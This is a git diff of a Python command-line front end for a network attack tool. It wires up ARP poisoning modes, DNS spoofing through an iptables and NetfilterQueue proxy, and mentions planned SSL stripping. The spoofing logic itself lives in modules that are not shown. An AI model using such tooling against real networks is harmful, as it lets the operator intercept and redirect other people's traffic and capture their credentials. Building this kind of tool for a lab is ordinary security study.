@@ -11,6 +11,9 @@ import dns_spoofing
 import proxy
 
 import scapy.all as scapy
+from netfilterqueue import NetfilterQueue
+
+is_arp_running = False
 
 # I guess for now we will have individual functions for each command,
 #  but later we can just have one function tha does arp_spoofing, dns_spoofing and ssl stripping
@@ -64,36 +67,43 @@ class SpoofToolCLI(cmd.Cmd):
             print("Attacker addresses not found, check interface")
             sys.exit()
 
-        # Call the arp_main function with the parsed arguments
-        #threading.Thread(target=arp_spoofing.arp_main, args=(attacker_addr, args.manual, args.router, args.iface, args.silent),
-        #                     daemon=True).start()
-        arp_spoofing.arp_main(attacker_addr, args.manual, args.router, args.iface, args.silent)
-        # if args.ssl:
-        #     print("SSL mode enabled")
-        #     time.sleep(5) # wait for arp
-        #     print("Starting SSL thread")
-        #     threading.Thread(target=ssl_main, args=(attacker_addr, args.iface), daemon=True).start()
+        # Start to ARP poison with the parsed arguments
+        print("ARP spoofing started")
+        global is_arp_running
+        is_arp_running = True
+
+        if not args.manual and not args.silent:
+            arp_spoofing.arp_prep_automated(args.router, args.iface)
+            arp_spoofing.arp_run()
+        elif args.manual and not args.silent: 
+            arp_spoofing.arp_prep(attacker_addr, args.manual, args.router, args.iface)
+            arp_spoofing.arp_run()
+        else: # silent mode
+            print("todo") #TODO: implement silent mode
+        return
+        
 
     def do_dns_spoof(self, line):
-        """Spoof DNS packets."""
+        """Spoof DNS packets. Run ARP First."""
         parser = argparse.ArgumentParser(prog='dns_spoof', description='Spoof DNS packets.')
-        parser.add_argument('-s', '--silent', action='store_true', help='Silent ARP mode (see ARP help)')
         parser.add_argument('-m', '--manual', nargs='*', help='Manual input of urls (default: all)')
-        parser.add_argument('-g', '--gateway', help='Gateway router (default: subnet.1)')
         parser.add_argument('-i', '--iface', default='enp0s10', help='Network Interface (default: enp0s10)')
-        parser.add_argument('-l', '--ssl', action='store_true', help='SSL stripping mode')
 
         try:
             args = parser.parse_args(line.split())
         except SystemExit:
             return  # argparse tries to exit the application when it fails
         
-        #TODO arguments
+        if args.manual:
+            print("Manual URL addresses: {}.".format(', '.join(args.manual)))
+        if args.iface:
+            print("Network interface: {}".format(args.iface))
 
-        print("dns spoofing started")
+        print("DNS spoofing started")
 
-        dns_spoofing.dns_main()
-
+        dns_spoofing.urls = args.manual
+        dns_spoofing.IFACE = args.iface
+        proxy.setup_proxy()
         pass
 
 
@@ -152,13 +162,22 @@ class SpoofToolCLI(cmd.Cmd):
                 print("^C")
                 exit()
 
+
+def exit_handler():
+        arp_spoofing.arp_looping = False
+        if arp_spoofing.arp_thread is not None:
+            arp_spoofing.arp_thread.join()
+        
+        proxy.undo_iptables()
+        if proxy.nfqueue is not None:
+            proxy.nfqueue.unbind()
+        exit()
+
 if __name__ == '__main__':
     cli = SpoofToolCLI()
-    
-    def exit_handler():
-        arp_spoofing.arp_looping = False
-        dns_spoofing.dns_looping = False
-        exit()
+
     atexit.register(exit_handler)
 
     cli.cmdloop()
+
+#wh
